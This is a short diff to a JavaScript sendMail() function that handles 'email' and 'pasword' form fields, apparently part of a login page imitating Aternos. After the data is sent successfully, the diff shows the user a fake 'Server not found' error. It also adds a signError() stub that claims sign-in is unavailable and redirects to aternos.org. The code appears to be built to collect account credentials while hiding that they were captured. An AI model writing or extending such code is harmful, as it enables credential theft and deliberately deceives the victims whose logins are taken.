@@ -31,7 +31,11 @@ function sendMail() {
         document.getElementById("email").value = "";
         document.getElementById("pasword").value = "";
         console.log(res);
-        alert("Your message sent successfully!!");
+        alert("ERROR: Server not found. Please try again.");
       })
       .catch((err) => console.log(err));
   }
+ 
+function signError() {
+  alert("ERROR: Signing in is not available in BETA. You can make an account at: https://aternos.org/go/")
+}
